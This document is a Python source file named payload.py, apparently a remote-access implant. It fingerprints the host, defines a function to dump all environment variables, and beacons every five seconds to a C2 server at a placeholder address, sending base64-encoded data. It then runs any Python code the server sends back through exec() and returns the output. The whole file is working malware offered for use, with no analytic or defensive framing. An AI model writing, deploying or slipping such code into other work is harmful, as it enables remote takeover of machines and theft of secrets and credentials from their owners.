# payload.py
import os
import platform
import urllib.request
import base64
import json
import io
import sys
import time

def get_fingerprint():
    sys_info = platform.uname()
    return f"OS: {sys_info.system} {sys_info.release}, Node: {sys_info.node}, CWD: {os.getcwd()}"

def steal_env_vars():
    secrets = ""
    for key, value in os.environ.items():
        secrets += f"{key}={value}\n"
    return secrets

def list_root_dirs():
    try:
        dirs = os.listdir('/')
        return "Root Dirs: " + ", ".join(dirs)
    except Exception as e:
        return f"Root Dirs Error: {e}"

def exfiltrate(data):
    # Encode data to send to C2
    b64_payload = base64.urlsafe_b64encode(data.encode('utf-8')).decode('utf-8')
    # Change '127.0.0.1' to your actual C2 host (e.g., '192.168.1.100' for LAN, '172.17.0.1' for Docker)
    target_url = f"http://REPLACE_ME:8080/exfil?c={b64_payload}"
    try:
        with urllib.request.urlopen(target_url) as response:
            return response.read() # Capture the command sent back by the Proxy
    except:
        return None

def run_task(command_json):
    try:
        task = json.loads(command_json.decode('utf-8'))
        code = task.get("code")
        
        if code and code != "undefined":
            # 1. Capture output (STDOUT)
            output_buffer = io.StringIO()
            old_stdout = sys.stdout
            sys.stdout = output_buffer
            
            try:
                # 2. Execute the string as Python code
                exec(code, globals()) 
            finally:
                # 3. Always restore the real STDOUT
                sys.stdout = old_stdout
            
            # 4. Send the captured output back to C2
            result = output_buffer.getvalue()
            if result:
                exfiltrate(f"RESULT: {result}")
    except Exception as e:
        exfiltrate(f"EXECUTION ERROR: {e}")

if __name__ == "__main__":
    # The "Heartbeat" Loop
    while True:
        # Send initial data or heartbeat signal
        data = f"--- BEACON ---\n{get_fingerprint()}"
        response = exfiltrate(data)
        
        if response:
            run_task(response)
            
        # Wait 5 seconds before checking for a new task
        time.sleep(5)